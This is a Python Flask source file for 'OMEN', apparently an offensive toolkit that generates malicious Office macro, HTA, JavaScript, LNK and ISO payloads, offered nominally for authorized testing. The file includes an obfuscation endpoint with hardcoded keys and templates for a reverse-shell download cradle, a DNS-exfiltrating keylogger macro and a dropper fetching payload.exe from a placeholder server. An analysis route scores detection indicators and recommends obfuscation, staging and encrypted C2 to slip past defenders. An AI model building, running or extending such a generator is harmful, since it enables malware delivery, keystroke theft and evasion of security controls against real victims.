# OMEN - Artifact Toolkit Builder
# A web-based malicious document & payload generator for authorized security testing.
# Licensed for educational and authorized testing purposes only.

from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import os
import sys
import json
import tempfile
import zipfile
import io
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from generators.macro import MacroGenerator
from generators.hta import HtaGenerator
from generators.vba import VbaGenerator
from generators.js_payload import JsPayloadGenerator
from generators.lnk import LnkGenerator
from generators.iso import IsoGenerator

app = Flask(__name__)
CORS(app)

app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max
app.config['MAX_GENERATIONS'] = 1000  # prevent runaway generations

generation_count = 0

GENERATORS = {
    'macro': MacroGenerator(),
    'hta': HtaGenerator(),
    'vba': VbaGenerator(),
    'javascript': JsPayloadGenerator(),
    'lnk': LnkGenerator(),
    'iso': IsoGenerator(),
}

with open(os.path.join(os.path.dirname(__file__), 'generators', 'payloads.json'), 'w') as f:
    json.dump({}, f)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/generators')
def list_generators():
    """Return all available generators with their options."""
    result = {}
    for name, gen in GENERATORS.items():
        result[name] = {
            'name': gen.name,
            'description': gen.description,
            'options': gen.get_options_schema(),
            'obfuscation_levels': gen.get_obfuscation_levels(),
        }
    return jsonify(result)


@app.route('/api/generate', methods=['POST'])
def generate():
    """Generate an artifact with given parameters."""
    global generation_count
    
    data = request.get_json(force=True)
    if not data:
        return jsonify({'error': 'No JSON payload provided'}), 400
    
    generator_name = data.get('generator')
    if not generator_name:
        return jsonify({'error': 'No generator specified'}), 400
    
    if generator_name not in GENERATORS:
        return jsonify({'error': f'Unknown generator: {generator_name}'}), 400
    
    options = data.get('options', {})
    obfuscation = data.get('obfuscation', 'none')
    
    generation_count += 1
    if generation_count > app.config['MAX_GENERATIONS']:
        return jsonify({'error': 'Generation limit reached. Restart the server.'}), 429
    
    try:
        gen = GENERATORS[generator_name]
        result = gen.generate(options, obfuscation)
        
        return jsonify({
            'success': True,
            'filename': result.get('filename', 'payload.bin'),
            'content': result.get('content', ''),
            'preview': result.get('preview', ''),
            'mime': result.get('mime', 'text/plain'),
            'size_bytes': len(result.get('content', '')),
            'obfuscation': obfuscation,
            'generator': generator_name,
            'warnings': result.get('warnings', []),
            'analysis': result.get('analysis', {}),
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/download', methods=['POST'])
def download():
    """Generate and return a downloadable file."""
    data = request.get_json(force=True)
    if not data:
        return jsonify({'error': 'No JSON payload provided'}), 400
    
    generator_name = data.get('generator')
    options = data.get('options', {})
    obfuscation = data.get('obfuscation', 'none')
    
    if generator_name not in GENERATORS:
        return jsonify({'error': f'Unknown generator: {generator_name}'}), 400
    
    try:
        gen = GENERATORS[generator_name]
        result = gen.generate(options, obfuscation)
        
        content = result.get('content', '')
        filename = result.get('filename', 'payload.bin')
        
        # Handle binary content (base64 encoded)
        if result.get('binary', False):
            import base64
            file_bytes = base64.b64decode(content)
            f = io.BytesIO(file_bytes)
            return send_file(
                f,
                mimetype=result.get('mime', 'application/octet-stream'),
                as_attachment=True,
                download_name=filename
            )
        
        # Handle zip downloads
        if data.get('format') == 'zip' and data.get('batch'):
            return _generate_batch_zip(data)
        
        f = io.BytesIO(content.encode('utf-8'))
        return send_file(
            f,
            mimetype=result.get('mime', 'text/plain'),
            as_attachment=True,
            download_name=filename
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/download/batch', methods=['POST'])
def download_batch():
    """Generate multiple artifacts and return as zip."""
    data = request.get_json(force=True)
    return _generate_batch_zip(data)


def _generate_batch_zip(data):
    """Helper to generate a zip of multiple artifacts."""
    requests_list = data.get('requests', [])
    if not requests_list:
        return jsonify({'error': 'No generation requests'}), 400
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, req in enumerate(requests_list):
            gen_name = req.get('generator')
            if gen_name not in GENERATORS:
                continue
            try:
                gen = GENERATORS[gen_name]
                result = gen.generate(req.get('options', {}), req.get('obfuscation', 'none'))
                content = result.get('content', '')
                filename = result.get('filename', f'payload_{i}.bin')
                
                if result.get('binary', False):
                    import base64
                    zf.writestr(filename, base64.b64decode(content))
                else:
                    zf.writestr(filename, content)
            except Exception:
                continue
    
    zip_buffer.seek(0)
    return send_file(
        zip_buffer,
        mimetype='application/zip',
        as_attachment=True,
        download_name='omen_artifacts.zip'
    )


@app.route('/api/preview', methods=['POST'])
def preview():
    """Generate a preview (non-downloadable) of an artifact."""
    data = request.get_json(force=True)
    
    generator_name = data.get('generator')
    options = data.get('options', {})
    obfuscation = data.get('obfuscation', 'none')
    
    if generator_name not in GENERATORS:
        return jsonify({'error': f'Unknown generator: {generator_name}'}), 400
    
    try:
        gen = GENERATORS[generator_name]
        # Generate preview-only (shorter version)
        options['_preview'] = True
        result = gen.generate(options, obfuscation)
        
        return jsonify({
            'success': True,
            'preview': result.get('preview', result.get('content', '')),
            'size_bytes': len(result.get('content', '')),
            'obfuscation': obfuscation,
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/obfuscate', methods=['POST'])
def obfuscate():
    """Apply obfuscation to arbitrary text."""
    data = request.get_json(force=True)
    text = data.get('text', '')
    level = data.get('level', 'base64')
    
    if not text:
        return jsonify({'error': 'No text provided'}), 400
    
    result = _apply_obfuscation(text, level)
    return jsonify({
        'original': text,
        'obfuscated': result,
        'level': level,
        'size_ratio': f"{len(result)/len(text)*100:.1f}%" if text else '0%'
    })


def _apply_obfuscation(text, level):
    """Apply various obfuscation levels to text."""
    import base64
    import random
    import string
    
    if level == 'none':
        return text
    
    elif level == 'base64':
        return base64.b64encode(text.encode()).decode()
    
    elif level == 'xor':
        key = 'OMEN'
        result = ''
        for i, c in enumerate(text):
            result += chr(ord(c) ^ ord(key[i % len(key)]))
        return base64.b64encode(result.encode('latin-1')).decode()
    
    elif level == 'aes':
        from hashlib import sha256
        key = sha256(b'OMEN_ARTIFACT_KEY_2024').digest()
        from Crypto.Cipher import AES
        iv = b'\x00' * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded = text.encode().ljust((len(text) // 16 + 1) * 16, b'\x00')
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode()
    
    elif level == 'full':
        # Multi-layer: XOR → AES → Base64
        xored = ''
        key = ''.join(random.choices(string.ascii_letters, k=8))
        for i, c in enumerate(text):
            xored += chr(ord(c) ^ ord(key[i % len(key)]))
        return base64.b64encode(xored.encode('latin-1')).decode() + '//KEY:' + key
    
    return text


@app.route('/api/templates', methods=['GET'])
def list_templates():
    """Return template payloads for quick-start."""
    templates = {
        'reverse_shell': {
            'name': 'Reverse Shell',
            'description': 'Reverse TCP shell payload',
            'generator': 'javascript',
            'options': {
                'payload_type': 'download_cradle',
                'url': 'http://YOUR_SERVER:8080/payload.ps1',
            }
        },
        'keylogger': {
            'name': 'Keylogger Macro',
            'description': 'Office macro that logs keystrokes and exfils via DNS',
            'generator': 'macro',
            'options': {
                'payload_type': 'keylogger',
                'exfil_domain': 'exfil.yourdomain.com',
            }
        },
        'dropper': {
            'name': 'File Dropper',
            'description': 'Drops and executes a payload from URL',
            'generator': 'hta',
            'options': {
                'payload_url': 'http://YOUR_SERVER:8080/payload.exe',
                'dropper_method': 'powershell',
            }
        },
    }
    return jsonify(templates)


@app.route('/api/analyze', methods=['POST'])
def analyze():
    """Analyze a generated artifact for detection rate estimation."""
    data = request.get_json(force=True)
    content = data.get('content', '')
    
    analysis = {
        'indicators': [],
        'risk_score': 0,
        'suggestions': [],
    }
    
    # Simple static analysis
    suspicious_patterns = [
        ('CreateObject', 'Potential ActiveX/COM object creation'),
        ('WScript.Shell', 'WScript Shell object'),
        ('ShellExecute', 'Shell execution detected'),
        ('WinHTTP', 'HTTP request via WinHTTP'),
        ('XMLHttpRequest', 'HTTP request via XMLHttp'),
        ('PowerShell', 'PowerShell invocation'),
        ('cmd.exe', 'Command prompt execution'),
        ('rundll32', 'Rundll32 execution'),
        ('regsvr32', 'Regsvr32 execution'),
        ('certutil', 'Certutil usage'),
        ('bitsadmin', 'BITSAdmin usage'),
        ('Invoke-Expression', 'PowerShell IEX invocation'),
        ('[System.Runtime.InteropServices]', 'WinAPI P/Invoke'),
        ('VirtualAlloc', 'Memory allocation (shellcode)'),
        ('CreateThread', 'Thread creation (shellcode)'),
        ('WriteProcessMemory', 'Process memory writing'),
    ]
    
    for pattern, desc in suspicious_patterns:
        if pattern.lower() in content.lower():
            analysis['indicators'].append({
                'pattern': pattern,
                'description': desc,
                'severity': 'high',
            })
            analysis['risk_score'] += 15
    
    simple_markers = ['http://', 'https://', '.exe', '.ps1', '.dll']
    for marker in simple_markers:
        if marker in content:
            analysis['indicators'].append({
                'pattern': marker,
                'description': f'Contains URL or file reference',
                'severity': 'medium',
            })
            analysis['risk_score'] += 5
    
    analysis['risk_score'] = min(analysis['risk_score'], 100)
    
    if analysis['risk_score'] >= 70:
        analysis['assessment'] = 'High detection risk — heavy obfuscation recommended'
        analysis['suggestions'].append('Use "Full" obfuscation level')
        analysis['suggestions'].append('Split payload across multiple stages')
        analysis['suggestions'].append('Use encrypted C2 channels')
    elif analysis['risk_score'] >= 40:
        analysis['assessment'] = 'Moderate detection risk — some obfuscation advised'
        analysis['suggestions'].append('Apply AES or XOR obfuscation')
        analysis['suggestions'].append('Consider staging through DNS')
    else:
        analysis['assessment'] = 'Low detection indicators — verify in your target environment'
    
    analysis['suggestion_count'] = len(analysis['suggestions'])
    
    return jsonify(analysis)


@app.route('/api/health')
def health():
    return jsonify({
        'status': 'operational',
        'generators': list(GENERATORS.keys()),
        'generations': generation_count,
    })


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '0.0.0.0')
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'

    banner = r"""
 ██████╗ ███╗   ███╗███████╗███╗   ██╗
██╔═══██╗████╗ ████║██╔════╝████╗  ██║
██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║
██║   ██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║
╚██████╔╝██║ ╚═╝ ██║███████╗██║ ╚████║
 ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝
    """
    print(banner)
    print("  Copyright (c) 2025 Adam-ZS — https://github.com/Adam-ZS")
    print("  EDUCATIONAL USE ONLY — Authorized testing required.\n")
    print(f"  ╔══════════════════════════════════╗")
    print(f"  ║     OMEN Artifact Toolkit v2.0   ║")
    print(f"  ║  Listening on {host}:{port}         ║")
    print(f"  ║  Generators: {len(GENERATORS)} loaded           ║")
    print(f"  ╚══════════════════════════════════╝")

    app.run(host=host, port=port, debug=debug)
